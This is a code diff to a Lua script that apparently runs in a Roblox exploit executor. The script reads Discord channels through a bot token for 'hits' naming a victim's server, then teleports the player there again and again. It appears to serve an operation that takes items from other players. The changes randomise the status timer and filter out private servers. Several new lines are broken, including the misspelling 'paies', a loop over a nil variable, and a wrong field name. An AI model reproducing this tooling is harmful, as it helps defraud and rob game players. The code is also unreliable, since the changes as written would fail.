@@ -1,8 +1,7 @@
--- Congratulations on finding me :3
-
 local AutoCollect = {
     GuildID = "1489086193822859306";
     ChannelID = "1497691010384396338";
+    ChannelID2 = "1490163560989593701";
     BotToken = _G.BotToken;
     ScanMessagesAmount = 8;
     BotInfoChannel = "1490163560989593701";
@@ -78,9 +77,9 @@ repeat task.wait() until LocalPlayer:FindFirstChild("PlayerGui") and
     LocalPlayer.PlayerGui.LoadingScreenGui.LoadingMessage.Visible == false
 local ScrGui = LocalPlayer.PlayerGui:WaitForChild("ScreenGui")
 
-local function GetMessages()
+local function GetMessages(ChannelID, Limit)
     local Request = http.request({
-        Url = "https://discord.com/api/v9/channels/" .. AutoCollect.ChannelID .. "/messages?limit=" .. tostring(AutoCollect.ScanMessagesAmount),
+        Url = "https://discord.com/api/v9/channels/" .. (ChannelID or AutoCollect.ChannelID) .. "/messages?limit=" .. (Limit or tostring(AutoCollect.ScanMessagesAmount)),
         Headers = {
             ["content-type"] = "application/json",
             authorization = "Bot " .. AutoCollect.BotToken
@@ -110,14 +109,15 @@ local function PublishMessage(ChannelID, Content)
 end
 
 task.spawn(function ()
-    local interval = 600 -- 10 minutes in seconds
+    local interval = math.random(600, 1200)
     local elapsed = 0
 
     while true do
         task.wait(interval)
+        interval = math.random(600, 1200)
         elapsed = elapsed + 10
 
-        local msg = "No hits in " .. elapsed .. " minutes, wallahi we r finished :skull:"
+        local msg = "Auto-Join is still running after " .. elapsed .. " minutes. There have not been any hits to take."
         PublishMessage(AutoCollect.BotInfoChannel, msg)
     end
 end)
@@ -128,7 +128,7 @@ local function SetMarked(id)
     local Clone = table.clone(Before)
     table.insert(Clone, 1, id)
     local NewTable = {}
-    for i, v in pairs(Clone) do
+    for i, v in paies(Clone) do
         if i <= (AutoCollect.ScanMessagesAmount) then
             NewTable[i] = v
         end
@@ -164,21 +164,39 @@ local function Scan(Tp, Json)
                     local AutjoinData = Content:match("Auto%-Join_Data:`(.+)`")
                     local AJdata = AutjoinData and game:GetService("HttpService"):JSONDecode(AutjoinData)
                     if AJdata then
-                        if Tp and not IsMarked(msg.id) and AJdata.completed == nil then
-                            writefile("ExodusAutojoin", AutjoinData)
-                            SetMarked(msg.id)
-                            task.spawn(function()
-                                PublishMessage(AutoCollect.BotInfoChannel, "Auto-Join is checking a hit (User ID: " .. AJdata.userid .. ")")
-                            end)
-                            repeat
-                                game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, AJdata.jobid, LocalPlayer)
-                                task.wait(2)
-                            until nil
-                        elseif Tp == false then
-                            if AJdata.completed and Json.jobid == game.JobId and Victim and tonumber(Json.userid) == Victim.UserId then
-                                return true
-                            else
-                                return false
+                        local HitsMessage
+                        local Messages = GetMessages(AutoCollect.ChannelID2, "100")
+                        if Messages then
+                            for i, v in pairs(HitsMessage) do
+                                if v.components then
+                                    local joinButton = v.components[1].components[1]
+                                    if joinButton and joinButton.url and joinButton.url:find(msg.jobid) then
+                                        print("join url: " .. joinButton.url)
+                                        HitsMessage = v
+                                        break
+                                    else
+                                        warn("That isnt a join button")
+                                    end
+                                end
+                            end
+                            if HitsMessage and not (HitsMessage.content or ""):find("Private Server") then
+                                if Tp and not IsMarked(msg.id) and AJdata.completed == nil then
+                                    writefile("ExodusAutojoin", AutjoinData)
+                                    SetMarked(msg.id)
+                                    task.spawn(function()
+                                        PublishMessage(AutoCollect.BotInfoChannel, "Auto-Join is checking a hit (User ID: " .. AJdata.userid .. ")")
+                                    end)
+                                    repeat
+                                        game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, AJdata.jobid, LocalPlayer)
+                                        task.wait(2)
+                                    until nil
+                                elseif Tp == false then
+                                    if AJdata.completed and Json.jobid == game.JobId and Victim and tonumber(Json.userid) == Victim.UserId then
+                                        return true
+                                    else
+                                        return false
+                                    end
+                                end
                             end
                         end
                     end
